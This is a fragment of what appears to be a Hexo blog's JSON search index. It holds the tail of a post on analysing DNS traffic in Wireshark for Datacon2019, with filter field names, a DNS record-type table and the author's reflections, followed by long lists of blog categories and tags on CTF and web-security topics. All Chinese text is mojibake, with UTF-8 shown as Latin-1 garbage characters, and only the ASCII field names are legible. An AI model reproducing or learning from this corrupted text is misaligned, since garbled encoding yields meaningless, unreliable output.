æ•°æ®åŒ…ä¸­DNSè¯·æ±‚æ•° udp.dstport ç›®çš„udpç«¯å£å· dns.count.answers æ•°æ®åŒ…ä¸­DNSå›ç­”æ•° eth.src æºMACåœ°å€ dns.count.auth_rr æ•°æ®åŒ…ä¸­æƒå¨è®°å½•æ•° eth.dst ç›®çš„MACåœ°å€ dns.count.add_rr æ•°æ®åŒ…ä¸­é¢å¤–è®°å½•æ•° dns.id DNS Transaction ID dns.qry.name DNSè¯·æ±‚å dns.flags.response DNSè¯·æ±‚/ç°æœ‰å“åº”æ ‡å¿— dns.qry.class DNSè¯·æ±‚ç±»å‹ dns.flags.opcode DNS opcode dns.resp.name DNSå“åº”å dns.flags.authoritative åº”ç­”æ˜¯å¦è¢«æœåŠ¡å™¨è®¤è¯ dns.resp.type DNSå›å¤ç±»å‹ dns.flags.truncated æ¶ˆæ¯æ˜¯å¦è¢«æˆªæ–­ dns.resp.ttl DNSå“åº”ç”Ÿå­˜æ—¶é—´ dns.flags.recdesired æ˜¯å¦é€’å½’æŸ¥è¯¢ dns.resp.z.do DNSæ˜¯å¦æ”¯æŒDNSSEC dns.flags.reavail æœåŠ¡å™¨æ˜¯å¦èƒ½é€’å½’æŸ¥è¯¢ frame.time_relative frameç›¸å¯¹æ—¶é—´ å¸¸ç”¨æŸ¥è¯¢å­—æ®µç±»å‹ TYPE å€¼ å«ä¹‰ A 1 ä¸»æœºåœ°å€ NS 2 æƒå¨æœåŠ¡å™¨ CNAME 5 åˆ«åçš„æ­£åˆ™åç§° SOA 6 æ ‡è®°æƒå¨åŒºåŸŸçš„å¼€å§‹ PTR 12 åŸŸåæŒ‡é’ˆ MX 15 é‚®ä»¶äº¤æ¢ TXT 16 æ–‡æœ¬å­—ç¬¦ä¸² DS 43 å§”æ‰˜ç­¾å‘è€… IXFR 251 å¢é‡åŒºåŸŸè½¬ç§» AXFR 252 æƒå¨åŒºåŸŸè½¬ç§» * 255 æ‰€æœ‰è§£æè®°å½•ï¼Œä¹Ÿæˆä¸ºANY æ€»ç»“ä¸åæ€ çœ‹äº†å¾ˆå¤šå¤§ä½¬ä»¬å†™çš„Writeupï¼Œç…§è‘«èŠ¦ç”»ç“¢å¤ç°äº†DNSæ¶æ„æµé‡åˆ†æï¼ŒæœŸé—´é‡åˆ°äº†ä¸å°‘çš„å›°éš¾ï¼Œæ¯”å¦‚ï¼š å¯¹DNSåè®®äº†è§£å¾ˆå°‘ æ•°æ®åŒ…éå¸¸å¤§ï¼Œæ²¡æœ‰æ”»å‡»æµé‡çš„æ ‡æ³¨ å¯¹æµé‡åˆ†æåŸºæœ¬æ˜¯é›¶èµ·æ­¥ï¼Œä¸çŸ¥é“è¯¥ä»å“ªé‡Œå¼€å§‹åˆ†æï¼Œæ²¡æœ‰ä¸€ä¸ªåˆç†çš„é€»è¾‘æ€ç»´ ç»è¿‡è¿™ä¸€è½®çš„å¤ç°ä¹‹åï¼Œå¯ä»¥è¯´å¯¹æµé‡åˆ†ææœ‰äº†ä¸€å®šçš„äº†è§£ï¼ŒçŸ¥é“äº†ä¸€äº›DNSçš„æ”»å‡»æ‰‹æ®µä»¥åŠæ”»å‡»ç‰¹å¾ï¼Œè¿˜æœ‰è‹¥å¹²éå¸¸å®ç”¨çš„æ–‡ä»¶å¤„ç†å‘½ä»¤ã€‚ä½†æ˜¯ï¼Œä¾ç„¶å­˜åœ¨å¾ˆå¤šä¸è¶³ï¼Œæ‰€ä»¥æ‰“ç®—ä»¥shyoshyoæ’°å†™çš„Writeupä¸ºæ¨¡æ¿ï¼Œæœ‰æ¡ç†ã€æœ‰é€»è¾‘çš„è¿›è¡Œç¬¬äºŒè½®æµé‡åˆ†æã€‚","tags":[{"name":"Wireshark","slug":"Wireshark","permalink":"http://ca0y1h.top/tags/Wireshark/"},{"name":"æµé‡åˆ†æ","slug":"æµé‡åˆ†æ","permalink":"http://ca0y1h.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"DNS","slug":"DNS","permalink":"http://ca0y1h.top/tags/DNS/"},{"name":"Datacon2019","slug":"Datacon2019","permalink":"http://ca0y1h.top/tags/Datacon2019/"}],"categories":[{"name":"æµé‡åˆ†æ","slug":"æµé‡åˆ†æ","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"æ¯”èµ›é¢˜","slug":"æµé‡åˆ†æ/æ¯”èµ›é¢˜","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E6%AF%94%E8%B5%9B%E9%A2%98/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"Webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"},{"name":"Rubyå’ŒGo","slug":"CTF/Rubyå’ŒGo","permalink":"http://ca0y1h.top/categories/CTF/Ruby%E5%92%8CGo/"},{"name":"NodeJS","slug":"CTF/NodeJS","permalink":"http://ca0y1h.top/categories/CTF/NodeJS/"},{"name":"Python","slug":"CTF/Python","permalink":"http://ca0y1h.top/categories/CTF/Python/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"CTF/æ–‡ä»¶åŒ…å«","permalink":"http://ca0y1h.top/categories/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"CTF/æ–‡ä»¶ä¸Šä¼ ","permalink":"http://ca0y1h.top/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"SSRF","slug":"CTF/SSRF","permalink":"http://ca0y1h.top/categories/CTF/SSRF/"},{"name":"XSS","slug":"CTF/XSS","permalink":"http://ca0y1h.top/categories/CTF/XSS/"},{"name":"å‘½ä»¤æ‰§è¡Œ","slug":"CTF/å‘½ä»¤æ‰§è¡Œ","permalink":"http://ca0y1h.top/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"SQLæ³¨å…¥","slug":"CTF/SQLæ³¨å…¥","permalink":"http://ca0y1h.top/categories/CTF/SQL%E6%B3%A8%E5%85%A5/"},{"name":"ä»£ç å®¡è®¡","slug":"CTF/ä»£ç å®¡è®¡","permalink":"http://ca0y1h.top/categories/CTF/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"ctf","slug":"ctf","permalink":"http://ca0y1h.top/categories/ctf/"},{"name":"æ¸—é€æµ‹è¯•","slug":"ctf/æ¸—é€æµ‹è¯•","permalink":"http://ca0y1h.top/categories/ctf/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"æ¡†æ¶æ¼æ´","slug":"CTF/æ¡†æ¶æ¼æ´","permalink":"http://ca0y1h.top/categories/CTF/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/"},{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"ä»£ç å®¡è®¡/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"},{"name":"HTB","slug":"é¶æœº/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"åŸºç¡€å…¥é—¨","slug":"æœºå™¨å­¦ä¹ /åŸºç¡€å…¥é—¨","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"},{"name":"æŠ€æœ¯éšç¬”","slug":"æŠ€æœ¯éšç¬”","permalink":"http://ca0y1h.top/categories/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"},{"name":"VulnHub","slug":"é¶æœº/VulnHub","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/VulnHub/"},{"name":"ç½‘ç»œå®‰å…¨","slug":"æœºå™¨å­¦ä¹ /ç½‘ç»œå®‰å…¨","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ‚è°ˆ","slug":"æ‚è°ˆ","permalink":"http://ca0y1h.top/categories/%E6%9D%82%E8%B0%88/"},{"name":"ç¼–ç¨‹","slug":"ç¼–ç¨‹","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"python","slug":"ç¼–ç¨‹/python","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/python/"},{"name":"java","slug":"ç¼–ç¨‹/java","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/java/"},{"name":"æµé‡åˆ†æ","slug":"æµé‡åˆ†æ","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"Bro","slug":"æµé‡åˆ†æ/Bro","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/Bro/"},{"name":"ç®—æ³•","slug":"ç¼–ç¨‹/ç®—æ³•","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/%E7%AE%97%E6%B3%95/"},{"name":"æ¯”èµ›é¢˜","slug":"æµé‡åˆ†æ/æ¯”èµ›é¢˜","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E6%AF%94%E8%B5%9B%E9%A2%98/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"},{"name":"Webå®‰å…¨å­¦ä¹ ","slug":"Webå®‰å…¨å­¦ä¹ ","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"æœåŠ¡å™¨è§£ææ¼æ´","slug":"æœåŠ¡å™¨è§£ææ¼æ´","permalink":"http://ca0y1h.top/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"},{"name":"LDAP","slug":"LDAP","permalink":"http://ca0y1h.top/tags/LDAP/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"http://ca0y1h.top/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"Webå®‰å…¨åŸºç¡€","slug":"Webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"PHPå˜é‡è§£æ","slug":"PHPå˜é‡è§£æ","permalink":"http://ca0y1h.top/tags/PHP%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90/"},{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"HTB","permalink":"http://ca0y1h.top/tags/HTB/"},{"name":"ctf","slug":"ctf","permalink":"http://ca0y1h.top/tags/ctf/"},{"name":"PHP","slug":"PHP","permalink":"http://ca0y1h.top/tags/PHP/"},{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"PHPååºåˆ—åŒ–","slug":"PHPååºåˆ—åŒ–","permalink":"http://ca0y1h.top/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"SSRF","slug":"SSRF","permalink":"http://ca0y1h.top/tags/SSRF/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"æ— å‚æ•°å‡½æ•°åˆ©ç”¨","slug":"æ— å‚æ•°å‡½æ•°åˆ©ç”¨","permalink":"http://ca0y1h.top/tags/%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"http://ca0y1h.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"é€»è¾‘å›å½’","slug":"é€»è¾‘å›å½’","permalink":"http://ca0y1h.top/tags/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/"},{"name":"Linux Enumeration","slug":"Linux-Enumeration","permalink":"http://ca0y1h.top/tags/Linux-Enumeration/"},{"name":"NoSQLæ³¨å…¥","slug":"NoSQLæ³¨å…¥","permalink":"http://ca0y1h.top/tags/NoSQL%E6%B3%A8%E5%85%A5/"},{"name":"xxeæ¼æ´","slug":"xxeæ¼æ´","permalink":"http://ca0y1h.top/tags/xxe%E6%BC%8F%E6%B4%9E/"},{"name":"Tmux","slug":"Tmux","permalink":"http://ca0y1h.top/tags/Tmux/"},{"name":"git","slug":"git","permalink":"http://ca0y1h.top/tags/git/"},{"name":"webå®‰å…¨å­¦ä¹ ","slug":"webå®‰å…¨å­¦ä¹ ","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"é€»è¾‘æ¼æ´","slug":"é€»è¾‘æ¼æ´","permalink":"http://ca0y1h.top/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"},{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8/"},{"name":"å‘½ä»¤æ‰§è¡Œ","slug":"å‘½ä»¤æ‰§è¡Œ","permalink":"http://ca0y1h.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"ç»éªŒ","slug":"ç»éªŒ","permalink":"http://ca0y1h.top/tags/%E7%BB%8F%E9%AA%8C/"},{"name":"ssrf","slug":"ssrf","permalink":"http://ca0y1h.top/tags/ssrf/"},{"name":"å›è°ƒåé—¨","slug":"å›è°ƒåé—¨","permalink":"http://ca0y1h.top/tags/%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"http://ca0y1h.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"å˜é‡è¦†ç›–","slug":"å˜é‡è¦†ç›–","permalink":"http://ca0y1h.top/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","permalink":"http://ca0y1h.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"python","slug":"python","permalink":"http://ca0y1h.top/tags/python/"},{"name":"IOç¼–ç¨‹","slug":"IOç¼–ç¨‹","permalink":"http://ca0y1h.top/tags/IO%E7%BC%96%E7%A8%8B/"},{"name":"XSS","slug":"XSS","permalink":"http://ca0y1h.top/tags/XSS/"},{"name":"çº¿æ€§å›å½’","slug":"çº¿æ€§å›å½’","permalink":"http://ca0y1h.top/tags/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"name":"hexo","slug":"hexo","permalink":"http://ca0y1h.top/tags/hexo/"},{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"http://ca0y1h.top/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"OSS","slug":"OSS","permalink":"http://ca0y1h.top/tags/OSS/"},{"name":"java","slug":"java","permalink":"http://ca0y1h.top/tags/java/"},{"name":"SQLMap","slug":"SQLMap","permalink":"http://ca0y1h.top/tags/SQLMap/"},{"name":"HTTPåè®®","slug":"HTTPåè®®","permalink":"http://ca0y1h.top/tags/HTTP%E5%8D%8F%E8%AE%AE/"},{"name":"Bro","slug":"Bro","permalink":"http://ca0y1h.top/tags/Bro/"},{"name":"å‡½æ•°å¼ç¼–ç¨‹","slug":"å‡½æ•°å¼ç¼–ç¨‹","permalink":"http://ca0y1h.top/tags/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://ca0y1h.top/tags/Leetcode/"},{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"http://ca0y1h.top/tags/%E7%AE%97%E6%B3%95/"},{"name":"MySQL","slug":"MySQL","permalink":"http://ca0y1h.top/tags/MySQL/"},{"name":"UDFææƒ","slug":"UDFææƒ","permalink":"http://ca0y1h.top/tags/UDF%E6%8F%90%E6%9D%83/"},{"name":"hashçˆ†ç ´","slug":"hashçˆ†ç ´","permalink":"http://ca0y1h.top/tags/hash%E7%88%86%E7%A0%B4/"},{"name":"LEMP","slug":"LEMP","permalink":"http://ca0y1h.top/tags/LEMP/"},{"name":"Nginx","slug":"Nginx","permalink":"http://ca0y1h.top/tags/Nginx/"},{"name":"Wireshark","slug":"Wireshark","permalink":"http://ca0y1h.top/tags/Wireshark/"},{"name":"æµé‡åˆ†æ","slug":"æµé‡åˆ†æ","permalink":"http://ca0y1h.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"DNS","slug":"DNS","permalink":"http://ca0y1h.top/tags/DNS/"},{"name":"Datacon2019","slug":"Datacon2019","permalink":"http://ca0y1h.top/tags/Datacon2019/"}]}